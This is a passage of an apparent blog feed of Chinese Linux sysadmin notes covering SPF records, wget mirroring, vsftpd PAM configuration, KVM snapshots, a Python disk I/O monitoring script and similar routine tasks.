首先，登录你的域名提供商的管理页面，这个页面就是通常是用来设置域名解析ip地址的地方。例如上述例子，可以这样声明，在域名的解析记录里添加一条txt记录，</li></ol><p>二级域名：空或@<br>txt记录值为：v=spf1 ip4:1.1.1.1 -all<br>这样，就设置了你的邮件只能是从1.1.1.1这个ip发出的。其中txt记录的意义：</p><p>v=spf1      #版本号声明；<br>ip4:x.x.x.x #指定ip地址；<br>-all        #对其余的标记为无效(FAIL)<br>当然这样设置有些问题就是你的域名可能需要变化的ip地址，或扩增多个ip，这时候就可以用其他方式，更改中间的部分（ip4对应位置）:</p><p>二级域名：空或@<br>txt记录值为：v=spf1 include:spf1.a.com include:spf2.a.com -all<br>再设置一个spf1.a.com的txt解析记录，内容为：</p><p>二级域名：spf1<br>txt记录值为：v=spf1 ip4:1.1.1.0/24 ip4:1.2.3.4 -all<br>其中include的意思是使用其后的地址的SPF记录。而ip4:1.1.1.0/24则是使用一个段。设置spf2.a.com与此类似。这样就可以使用更多的地址作为合法地址。也可以include多层，但常见的一般最多三层已经够用，最后一层要指定到具体的ip或域名。</p><p>其他如：v=spf1 a mx ip4:x.x.x.x -all 使用a记录，mx解析记录和指定的ip作为合法地址。</p><p>3.更多<br>关于剩余检查项all前面的“-”符号，参见下表：</p><p>“+”  Pass（通过）<br>“-“  Fail（拒绝）<br>“~”  Soft Fail（软拒绝）<br>“?”  Neutral（中立）<br>建议使用“-all”来拒绝陌生地址的邮件。当使用“~all”时，一般会将邮件标记为垃圾邮件。但是由于有时人们还是会翻查垃圾邮件（甚至有时官方都会建议去检查垃圾邮件），因此这样处理并不安全。所以如无特殊需求，建议使用“-all”来拒绝。</p><p>禁用所有邮件服务：</p><p>v=spf1 -all<br>详细语法说明（英文）： <a href="http://www.openspf.org/SPF_Record_Syntax" target="_blank" rel="noopener">http://www.openspf.org/SPF_Record_Syntax</a></p><p><a href="http://www.openspf.org/RFC_4408" target="_blank" rel="noopener">http://www.openspf.org/RFC_4408</a></p><p>（用空的话把这个翻译出来）</p><p>参考链接（中文）：<a href="http://www.renfei.org/blog/introduction-to-spf.html" target="_blank" rel="noopener">http://www.renfei.org/blog/introduction-to-spf.html</a></p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mac的terminal中title更新问题</title>
      <link href="/2018/01/31/mac-e7-9a-84terminal-e4-b8-adtitle-e6-9b-b4-e6-96-b0-e9-97-ae-e9-a2-98/"/>
      <url>/2018/01/31/mac-e7-9a-84terminal-e4-b8-adtitle-e6-9b-b4-e6-96-b0-e9-97-ae-e9-a2-98/</url>
      <content type="html"><![CDATA[<p>在mac中，使用terminal中ssh登陆进一台机器，默认的title标签会更新，但登出时无法恢复原来的title，使用修改如下： /etc/bashrc 里添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PROMPT_COMMAND=&apos;printf &quot;\\033]0;%s@%s:%s\\007&quot; &quot;$&#123;USER&#125;&quot; &quot;$&#123;HOSTNAME%%.*&#125;&quot; &quot;$&#123;PWD/#$HOME/~&#125;&quot;&apos;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> MAC </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>wget整站下载</title>
      <link href="/2012/08/29/wget-station-download/"/>
      <url>/2012/08/29/wget-station-download/</url>
      <content type="html"><![CDATA[<p>需要下载某个目录下面的所有文件。命令如下 wget -c -r -np -k -L -p <a href="http://www.xianren.org/pub/path/" target="_blank" rel="noopener">www.xianren.org/pub/path/</a> 在下载时。有用到外部域名的图片或连接。如果需要同时下载就要用-H参数。 wget -np -nH -r –span-hosts <a href="http://www.xianren.org/pub/path/" target="_blank" rel="noopener">www.xianren.org/pub/path/</a> -c 断点续传 -r 递归下载，下载指定网页某一目录下（包括子目录）的所有文件 -nd 递归下载时不创建一层一层的目录，把所有的文件下载到当前目录 -np 递归下载时不搜索上层目录，如wget -c -r <a href="http://www.xianren.org/pub/path/" target="_blank" rel="noopener">www.xianren.org/pub/path/</a> 没有加参数-np，就会同时下载path的上一级目录pub下的其它文件 -k 将绝对链接转为相对链接，下载整个站点后脱机浏览网页，最好加上这个参数 -L 递归时不进入其它主机，如wget -c -r <a href="http://www.xianren.org/" target="_blank" rel="noopener">www.xianren.org/</a> wget下载中文乱码问题，请加下如下参数 –restrict-file-names=nocontrol</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wget整站下载 </tag>
            
            <tag> 乱码 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>中文ubuntu里用户目录里的路径改成英文</title>
      <link href="/2012/08/26/the-path-in-the-chinese-ubuntu-user-directory-is-changed-to-english/"/>
      <url>/2012/08/26/the-path-in-the-chinese-ubuntu-user-directory-is-changed-to-english/</url>
      <content type="html"><![CDATA[<p>为了使用起来方便，装了ubuntu中文版，自然在home文件里用户目录的“桌面”、“图片”、“视频”、“音乐”……都是中文的。</p><p>   很多时候都喜欢在桌面上放一些要操作的文件，linux里命令行操作又多，难免会用命令行操作桌面上的东西，那么就要 “cd  桌面”，打“桌面”的时候要输入法切换，麻烦……所以就想办法把用户目录下的路径改成英文，而其他的中文不变，方法如下：</p><p>打开终端，在终端中输入命令:  </p><pre><code>export LANG=en_USxdg-user-dirs-gtk-update</code></pre><p>跳出对话框询问是否将目录转化为英文路径,同意并关闭.<br>在终端中输入命令:</p><pre><code>export LANG=zh_CN</code></pre><p>关闭终端,并重起.下次进入系统,系统会提示是否把转化好的目录改回中文.选择不再提示,并取消修改.主目录的中文转英文就完成了~</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> ubuntu </tag>
            
            <tag> 主目录 </tag>
            
            <tag> 修改 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sl410k上ubuntu12.04创建wifi热点，客户端无法获取ip地址的问题</title>
      <link href="/2012/08/26/on-sl410k-ubuntu12-04-creates-wifi-hotspots-and-the-client-cannot-get-ip-address/"/>
      <url>/2012/08/26/on-sl410k-ubuntu12-04-creates-wifi-hotspots-and-the-client-cannot-get-ip-address/</url>
      <content type="html"><![CDATA[<p>sl410k上ubuntu12.04创建wifi热点，客户端无法获取ip地址的问题<br>创建一个adhoc的网络就可以。<br>tar zxvf 92ce_se_de_linux_mac80211_0005.1230.2011.tar.gz<br>cd rtl_92ce_92se_92de_linux_mac80211_0005.1230.2011/<br>cp /lib/modules/3.2.0-29-generic-pae/kernel/drivers/net/wireless/rtlwifi/rtlwifi.ko /tmp/<br>cp /lib/modules/3.2.0-29-generic-pae/kernel/drivers/net/wireless/rtlwifi/rtl8192se/rtl8192se.ko /tmp<br>sudo cp rtl8192se.ko /lib/modules/3.2.0-29-generic-pae/kernel/drivers/net/wireless/rtlwifi/rtl8192se/<br>sudo cp rtlwifi.ko /lib/modules/3.2.0-29-generic-pae/kernel/drivers/net/wireless/rtlwifi/<br>sudo modprobe rtl8192se rtlwifi<br>FATAL: Error inserting rtl8192se (/lib/modules/3.2.0-29-generic-pae/kernel/drivers/net/wireless/rtlwifi/rtl8192se/rtl8192se.ko): Unknown symbol in module, or unknown parameter (see dmesg)<br>sudo modinfo rtl8192se<br>filename:       /lib/modules/3.2.0-29-generic-pae/kernel/drivers/net/wireless/rtlwifi/rtl8192se/rtl8192se.ko<br>firmware:       rtlwifi/rtl8192sefw.bin<br>description:    Realtek 8192S/8191S 802.11n PCI wireless<br>license:        GPL<br>author:         Realtek WlanFAE    <a href="mailto:&#119;&#x6c;&#x61;&#x6e;&#x66;&#97;&#101;&#x40;&#x72;&#101;&#x61;&#x6c;&#x74;&#101;&#x6b;&#46;&#99;&#111;&#x6d;" target="_blank" rel="noopener">&#119;&#x6c;&#x61;&#x6e;&#x66;&#97;&#101;&#x40;&#x72;&#101;&#x61;&#x6c;&#x74;&#101;&#x6b;&#46;&#99;&#111;&#x6d;</a><br>author:         lizhaoming    <a href="mailto:&#x63;&#x68;&#x61;&#x6f;&#x6d;&#x69;&#110;&#103;&#95;&#108;&#105;&#x40;&#x72;&#101;&#97;&#x6c;&#115;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;&#46;&#x63;&#110;" target="_blank" rel="noopener">&#x63;&#x68;&#x61;&#x6f;&#x6d;&#x69;&#110;&#103;&#95;&#108;&#105;&#x40;&#x72;&#101;&#97;&#x6c;&#115;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;&#46;&#x63;&#110;</a><br>srcversion:     B5184945312BE0F016AC596<br>alias:          pci:v000010ECd00008174sv*sd*bc*sc*i<em><br>alias:          pci:v000010ECd00008173sv\</em>sd*bc*sc*i<em><br>alias:          pci:v000010ECd00008172sv\</em>sd*bc*sc*i<em><br>alias:          pci:v000010ECd00008171sv\</em>sd*bc*sc*i<em><br>alias:          pci:v000010ECd00008192sv\</em>sd*bc*sc*i*<br>depends:        rtlwifi,mac80211<br>vermagic:       3.2.0-29-generic-pae SMP mod_unload modversions 686<br>parm:           fwlps:bool<br>parm:           swenc:using hardware crypto (default 0 [hardware])<br> (bool)<br>parm:           ips:using no link power save (default 1 is open)<br> (bool)<br>parm:           swlps:using linked sw control power save (default 1 is open)<br> (bool)<br>cd rtl_92ce_92se_92de_linux_mac80211_0005.1230.2011/<br>cd firmware/rtlwifi/<br>cp /lib/firmware/rtlwifi/rtl8192sefw.bin /tmp/<br>sudo cp rtlwifi/rtl8192sefw.bin /lib/firmware/rtlwifi/<br>sudo modprobe rtl8192se<br>sudo modprobe rtlwifi<br>ifconfig<br>再重新测试wifi，已经一切正常，看来是12.04的通用驱动程序的问题</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 12.04 </tag>
            
            <tag> adhoc </tag>
            
            <tag> sl410k </tag>
            
            <tag> ubuntu </tag>
            
            <tag> wifi </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sendmail+formail乱码</title>
      <link href="/2012/07/23/the-sendmail-formail-garbled/"/>
      <url>/2012/07/23/the-sendmail-formail-garbled/</url>
      <content type="html"><![CDATA[<p>之前使用sendmail发邮件一直有乱码的问题，后来使用如下方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/striven/tmp/applist.log |formail -I &quot;From:applist@sky-mobi.com&quot; -I &quot;MIME-Version:1.0&quot; -I &quot;Content-type:text;charset=utf-8&quot; -I &quot;Subject:applist&quot; |/usr/sbin/sendmail -toi $mailuser</span><br></pre></td></tr></table></figure></p><p>这样邮件的正文就正常了，但主题如果有中文会乱码，而且看不到收件人有哪些，这是因为formail里没有定义To:给sendmail,改进如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/striven/tmp/applist.log |formail -I &quot;From:applist@sky-mobi.com&quot; -I &quot;MIME-Version:1.0&quot; -I &quot;Content-type:text;charset=utf-8&quot; -I &quot;Subject:applist&quot; -I &quot;To:$mailuser&quot; |/usr/sbin/sendmail -toi</span><br></pre></td></tr></table></figure></p><p>这样收件人就看得到了，而不会再是  </p><p>Undisclosed recipients。<br>对于主题或者收发邮件人中文乱码的问题，通过计算中文以后的base64，再给sendmail，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo “中国人我是” |formail -I &quot;From:applist@sky-mobi.com&quot; -I &quot;MIME-Version:1.0&quot; -I &quot;Content-type:text;charset=utf-8&quot;   </span><br><span class="line">-I &quot;Subject:=?UTF-8?B?\`echo &apos;sendmail发邮件为什么主题会中文乱码?&apos;|base64\`?=&quot; -I &quot;To:Talen.Hao@sky-mobi.com&quot;|  </span><br><span class="line">/usr/sbin/sendmail -toi</span><br></pre></td></tr></table></figure></p><p>这样就可以。<br>听说也可以使用mutt来解决</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sendmail主题乱码 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>vsftpd虚拟用户和本地用户不能共存的解决方法</title>
      <link href="/2012/07/06/vsftpd-virtual-users-and-local-users-can-t-coexist-solutions/"/>
      <url>/2012/07/06/vsftpd-virtual-users-and-local-users-can-t-coexist-solutions/</url>
      <content type="html"><![CDATA[<p>在配置vsftpd的过程中，听信了网上的谗言，把vsftpd配了一遍，发现配完，虚拟用户和本地用户不能共存，即虚拟用户可以登录ftp，但是本地用 户不能登录的ftp。折腾了很久，包括上网找过很多内容都找不到解决方法，大家貌似都没有这样的问题，或者找不到解决办法（在看众多教程中貌似有看到过和 本方法一样的配置，但是那份内容里面完全没有提到/etc/pam.d/vsftpd里面为什么要这样写）。在洗澡过程中想了想，既然本地用户无法登录， 那应该是pam验证的时候就没有给本地用户过。实验证明人在洗澡的时候是最清醒的时候。哈哈！回来实验，发现如果把/etc/pam.d/vsftpd 中的  </p><p>auth required pam_userdb.so db=/etc/vsftpd/vuser_passwd<br>account required pam_userdb.so db=/etc/vsftpd/vuser_passwd  </p><p>注 释掉，然后把里面其它的内容都打开注释（网上大部分教程教建立虚拟用户时，都说把上面两句加入/etc/pam.d/vsftpd中，然后把里面的其它东 西注释掉），这时候再尝试，发现本地用户能登录！！！这也证明了是pam模块认证的问题让虚拟用户和本地用户不能共存。所以就去了解了一下pam配置的内 容，如下网址：  </p><p><a href="http://www.ibm.com/developerworks/cn/linux/l-pam/" target="_blank" rel="noopener">http://www.ibm.com/developerworks/cn/linux/l-pam/</a>  </p><p>里面提到：<br>Required：堆栈中的所有 Required 模块必须看作一个成功的结果。如果一个或多个 Required 模块失败，则实现堆栈中的所有 Required 模块，但是将返回第一个错误。  </p><p>也 就意味着，required需要所有内容都满足才行，当我们前两条配置虚拟用户登录验证通过后，继续向下面的配置条目进行验证，验证是否是本地用户时结果 发现不是，又因为，验证本地用户的control_flag(见上网址中解释)也为required，所以这时候，就会返回错误，也即验证不成功。  </p><p>所以我们不能同时设置虚拟用户和本地用户的control_flag为required。按照上面的网址所说：<br>Sufficient：如果标记为 sufficient 的模块成功并且先前没有 Required 或 sufficient 模块失败，则忽略堆栈中的所有其余模块并返回成功。  </p><p>我们可以把虚拟用户的验证配置放在最前面，且把control_flag设为sufficient。这样的话，如果遇到是虚拟用户，那么可以通过验证，如果是本地用户，忽略掉sufficient的两条配置规则，只要满足required就行，所以也能通过验证。  </p><p>如下为/etc/pam.d/vsftpd的内容：  </p><p>#%PAM-1.0<br>auth sufficient pam_userdb.so db=/etc/vsftpd/vuser_passwd<br>account sufficient pam_userdb.so db=/etc/vsftpd/vuser_passwd  </p><p>session optional pam_keyinit.so force revoke<br>auth required pam_listfile.so item=user sense=deny file=/etc/vsftpd/ftpusers onerr=succeed<br>auth required pam_shells.so<br>auth include password-auth<br>account include password-auth<br>session required pam_loginuid.so<br>session include password-auth  </p><p>上 面两行为后面加上，虚拟用户pam认证需要的配置条目，下面为原来vsftpd的认证配置规则，可以看到，本地用户用的是password-auth，从 这里可以看出如果要虚拟用户和本地用户共存，两部分都不能注释。网上说的注释掉下面的部分，这种情况本地用户都不能登录。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>KVM镜像快照功能实验小记</title>
      <link href="/2012/01/17/kvm-image-snapshot-function-experiment/"/>
      <url>/2012/01/17/kvm-image-snapshot-function-experiment/</url>
      <content type="html"><![CDATA[<p>-snapshot       write to temporary files instead of disk image files  </p><p>意思是不更改镜像文件，启动后的所有改动均不会往镜像文件上写。临时文件存放在内存中了，具体是cached  </p><p>感觉这个解释有点问题，晚上闲来无事，就简单做了个测试，实验过程如下：  </p><p>使用libvirt创建的虚拟机，默认格式为raw，要想使用快照功能，需要先将其转换格式。  </p><p>1：qemu-img  snapshot  -c   base_sys_centos5.564bit.img   CentOS5.5_64bit.img<br>在现有镜像基础上创建一个快照。<br>报如下错误：<br>emu-img: Could not create snapshot ‘base_sys_centos5.564bit.img’: -95 (Operation not supported）  </p><p>2：怀疑是文件格式不对，查看一下。<br>qemu-img   info    CentOS5.5_64bit.img<br>image: CentOS5.5_64bit.img<br>file format: raw<br>virtual size: 20G (21474836480 bytes)<br>disk size: 3.4G  </p><p>果然是raw格式  </p><p>3：使用如下命令将raw格式的镜像转化为qcow2格式。<br>qemu-img   convert   -f  raw   -O qcow2    CentOS5.5_64bit.img    CentOS5.5_64bit_basesys_qcow2.img  </p><p>4：转换成功后，再次对镜像创建一个快照  </p><p>qemu-img snapshot -c CentOS5.5_64bit_Qcow2_basesys.img CentOS5.5_64bit_Qcow2.img  </p><p>OK，创建成功。  </p><p>该步并不会创建一个新的镜像，可以使用如下命令来查看指定的镜像上是否存在快照，并在合适的时候，恢复快照。  </p><p>qemu-img  snapshot -l CentOS5.5_64bit_Qcow2.img  </p><p>Snapshot list:<br>ID        TAG                 VM SIZE                DATE       VM CLOCK<br>1         CentOS5.5_64bit_Qcow2_basesys.img      0 2011-07-21 23:17:38   00:00:00.000  </p><p>恢复快照：  </p><p>qemu-img  snapshot   -a   CentOS5.5_64bit_Qcow2_basesys.img    CentOS5.5_64bit_Qcow2.img  </p><p>其他操作：  </p><p>  ‘snapshot’ is the name of the snapshot to create, apply or delete<br>  ‘-a’ applies a snapshot (revert disk to saved state)<br>  ‘-c’ creates a snapshot<br>  ‘-d’ deletes a snapshot  </p><h1 id="‘-l’-lists-all-snapshots-in-the-given-image"><a href="#‘-l’-lists-all-snapshots-in-the-given-image" class="headerlink" title="  ‘-l’ lists all snapshots in the given image"></a>  ‘-l’ lists all snapshots in the given image</h1>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kvm </tag>
            
            <tag> snapshot </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>如何找出当前占用磁盘IO最多的进程</title>
      <link href="/2011/12/25/how-do-i-find-the-process-that-currently-consumes-the-most-disk-io/"/>
      <url>/2011/12/25/how-do-i-find-the-process-that-currently-consumes-the-most-disk-io/</url>
      <content type="html"><![CDATA[<p>linux系统上可以使用（centos 2.6.18-144开始支持），dstat版本至少是：dstat-0.6.7-1.rf.noarch.rpm<br>安装<br>wget -c <a href="http://linux.web.psi.ch/dist/scientific/5/gfa/all/dstat-0.6.7-1.rf.noarch.rpm" target="_blank" rel="noopener">http://linux.web.psi.ch/dist/scientific/5/gfa/all/dstat-0.6.7-1.rf.noarch.rpm</a><br>rpm -Uvh dstat-0.6.7-1.rf.noarch.rpm</p><p>使用<br># dstat -M topio -d -M topbio  </p><p>Linux Kernel 2.6.20 以上的内核支持进程 IO 统计，可以用类似 iotop 这样的工具来监测每个进程对 IO 操作的情况，就像用 top 来实时查看进程内存、CPU 等占用情况那样。但是对于 2.6.20 以下的 Linux 内核版本就没那么幸运了，根据 <a href="http://stackoverflow.com/questions/249570/" target="_blank" rel="noopener">Stack Overflow 的这篇回帖</a> 给出的方法，VPSee 写了一个简单的 Python 脚本用来在 linux kernel &lt; 2.6.20 下打印进程 IO 状况。</p><p>这个脚本的想法很简单，把 dmesg 的结果重定向到一个文件后再解析出来，每隔1秒钟打印一次进程 IO 读写的统计信息，执行这个脚本需要 root：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">!/usr/bin/python</span><br><span class="line"># Monitoring per-process disk I/O activity</span><br><span class="line"></span><br><span class="line">import sys, os, time, signal, re , string</span><br><span class="line"></span><br><span class="line">class DiskIO:</span><br><span class="line">    def __init__(self, pname=None, pid=None, reads=0, writes=0):</span><br><span class="line">        self.pname = pname</span><br><span class="line">        self.pid = pid</span><br><span class="line">        self.reads = 0</span><br><span class="line">        self.writes = 0</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    argc = len(sys.argv)</span><br><span class="line">    interatime = 0</span><br><span class="line">    maxtry = 100000</span><br><span class="line">    i=0</span><br><span class="line">    if argc != 1 and argc !=2 and argc !=3:</span><br><span class="line">        print &quot;usage: python prethread.py&quot;</span><br><span class="line">        print &quot;usage: python prethread.py count&quot;</span><br><span class="line">        print &quot;usage: python prethread.py count interval&quot;</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    if os.getuid() != 0:</span><br><span class="line">        print &quot;must be run as root&quot;</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    if argc == 2:</span><br><span class="line">        maxtry = string.atoi(sys.argv[1])</span><br><span class="line">    if argc == 3:</span><br><span class="line">        maxtry = string.atoi(sys.argv[1])</span><br><span class="line">        interatime = string.atoi(sys.argv[2])</span><br><span class="line"></span><br><span class="line">    signal.signal(signal.SIGINT, signal_handler)</span><br><span class="line">    os.system(&apos;echo 1 &gt; /proc/sys/vm/block_dump&apos;)</span><br><span class="line">    print &quot;TASK              PID       READ      WRITE&quot;</span><br><span class="line">    while i &lt; maxtry:</span><br><span class="line">        os.system(&apos;dmesg -c &gt; /tmp/diskio.log&apos;)</span><br><span class="line">        l = []</span><br><span class="line">        f = open(&apos;/tmp/diskio.log&apos;, &apos;r&apos;)</span><br><span class="line">        line = f.readline()</span><br><span class="line">        while line:</span><br><span class="line">            m = re.match(\</span><br><span class="line">                &apos;^(\S+)\((\d+)\): (READ|WRITE) block (\d+) on (\S+)&apos;, line)</span><br><span class="line">            if m != None:</span><br><span class="line">                if not l:</span><br><span class="line">                    l.append(DiskIO(m.group(1), m.group(2)))</span><br><span class="line">                    line = f.readline()</span><br><span class="line">                    continue</span><br><span class="line">                found = False</span><br><span class="line">                for item in l:</span><br><span class="line">                    if item.pid == m.group(2):</span><br><span class="line">                        found = True</span><br><span class="line">                        if m.group(3) == &quot;READ&quot;:</span><br><span class="line">                            item.reads = item.reads + 1</span><br><span class="line">                        elif m.group(3) == &quot;WRITE&quot;:</span><br><span class="line">                            item.writes = item.writes + 1</span><br><span class="line">                if not found:</span><br><span class="line">                    l.append(DiskIO(m.group(1), m.group(2)))</span><br><span class="line">            line = f.readline()</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        for item in l:</span><br><span class="line">            print &quot;%-10s %10s %10d %10d&quot; % \</span><br><span class="line">                (item.pname, item.pid, item.reads, item.writes)</span><br><span class="line">        print &quot;-----------------------------------------------&quot;</span><br><span class="line">        if interatime &gt;0:</span><br><span class="line">            time.sleep(interatime)</span><br><span class="line">        i= i+1</span><br><span class="line">    os.system(&quot;rm -f  /tmp/diskio.log&quot;)</span><br><span class="line"></span><br><span class="line">def signal_handler(signal, frame):</span><br><span class="line">    os.system(&apos;echo 0 &gt; /proc/sys/vm/block_dump&apos;)</span><br><span class="line">    os.system(&quot;rm -f  /tmp/diskio.log&quot;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><p>如果想用 iotop 来实时查看进程 IO 活动状况的话，需要下载和升级新内核（2.6.20 或以上版本）。编译新内核时需要打开 TASK_DELAY_ACCT 和 TASK_IO_ACCOUNTING 选项。解压内核后进入配置界面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># tar jxvf linux-2.6.30.5.tar.bz2 </span><br><span class="line"># mv linux-2.6.30.5 /usr/src/ </span><br><span class="line"># cd /usr/src/linux-2.6.30.5 </span><br><span class="line"># make menuconfig</span><br></pre></td></tr></table></figure></p><p>选择 Kernel hacking –&gt; Collect scheduler debugging info 和 Collect scheduler statistics，保存内核后编译内核：</p><p># make; make modules; make modules_install; make install </p><p>修改 grub，确认能正确启动新内核：</p><p># vi /boot/grub/menu.lst </p><p>出了新内核外，iotop 还需要 Python 2.5 或以上才能运行，所以如果当前 Python 是 2.4 的话需要下载和安装最新的 Python 包。这里使用源代码编译安装：</p><p># tar jxvf Python-2.6.2.tar.bz2 # cd Python-2.6.2 # ./configure # make; make install </p><p>别忘了下载 setuptools：</p><p># mv setuptools-0.6c9-py2.6.egg.sh setuptools-0.6c9-py2.6.egg # sh setuptools-0.6c9-py2.6.egg </p><h2 id="更多信息"><a href="#更多信息" class="headerlink" title="更多信息"></a>更多信息</h2><p>如果想知道更多关于 block_dump 的信息，可以看看这篇 <a href="http://www.vpsee.com/2010/07/monitoring-process-io-activity-on-linux-with-block_dump/" target="_blank" rel="noopener">监测 Linux 进程的实时 IO 情况</a>。使用 block_dump 的时候，最好能关掉 klogd 进程。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用zssh远程传送文件</title>
      <link href="/2011/12/10/use-zssh-to-transfer-files-remotely/"/>
      <url>/2011/12/10/use-zssh-to-transfer-files-remotely/</url>
      <content type="html"><![CDATA[<p>zssh的全名叫ZMODEM SSH.看名字就知道，使用的zmodem，我们习惯了SecureCRT,直接就可以用来发送文件，比使用scp方便很多。</p><p>zmodem协议方便主要表示在以下点</p><p>其一,不需要输入很长的命令和密码，直接使用rz,sz加文件名，就能实现文件的收发。速度还很快。</p><p>其二,在中转了一台主机时，要在目标主机和本地主机之类，要传送文件，scp相当的麻烦，需要输入多次命令用户密码.但sz直接可以穿透。</p><p>好了，讲使用,如下，和使用ssh完全一样，只是打命令时，变成了zssh</p><p><strong>#zssh <a href="mailto:root@www.php-oa.com" target="_blank" rel="noopener">root@www.php-oa.com</a></strong></p><p>好了，在进入后，你需要<strong>上传</strong>文件的话。先</p><p>**#ctrl+@  </p><blockquote><p>sz filename**[可选参数-be:二进制方式]</p></blockquote><p><strong>下载</strong>文件的话</p><p><strong>#sz filename</strong><br>然后在</p><p>**#ctrl+@  </p><blockquote><p>rz**</p></blockquote><p><strong>zssh&gt; exit</strong> 回到远程服务器 使用也是相当的方便</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zssh </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>linux用find文件，用-prune排除文件夹</title>
      <link href="/2011/11/24/linux-uses-the-find-file-to-exclude-folders-from-the-prune/"/>
      <url>/2011/11/24/linux-uses-the-find-file-to-exclude-folders-from-the-prune/</url>
      <content type="html"><![CDATA[<p>linux下的常用命令find，加上不同的参数，可以使你很容易的找到需要的文件，但是有些时候，你在查找文件的同时，可能不需要在某文件夹下查找，这时候-prune就用上了。</p><p>比如在当前目录下寻找pl后缀的文件，不在scripts下寻找。</p><p>find . -path ‘./scripts’ -prune -o -name ‘*.pl’ -print</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>如何将自动挂载的磁盘不显示在桌面上</title>
      <link href="/2011/11/19/how-do-i-put-an-auto-mounted-disk-on-the-desktop/"/>
      <url>/2011/11/19/how-do-i-put-an-auto-mounted-disk-on-the-desktop/</url>
      <content type="html"><![CDATA[<p>如何将自动挂载的磁盘不显示在桌面上？！<br>解决方案：<br>安装Configuration Editor，使用yum来安装是最简单的：[img=16,16]<a href="http://www.im321.com/blog/images/quote.gif[/img]" target="_blank" rel="noopener">http://www.im321.com/blog/images/quote.gif[/img]</a> 引用内容<br>sudo yum -y install gconf-editor  </p><p>打开Configuration Editor，找到/apps/nautilus/desktop/volumes_visible，取消前面的勾即可。  </p><p>顺便提示一下，所有经过Configuration Editor编辑的内容，都可以在 ~/.gconf/找到相应的配置文件。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CentOS中简单用yum升级 Python 至2.6</title>
      <link href="/2011/11/16/centos-simply-uses-yum-to-upgrade-python-to-2-6/"/>
      <url>/2011/11/16/centos-simply-uses-yum-to-upgrade-python-to-2-6/</url>
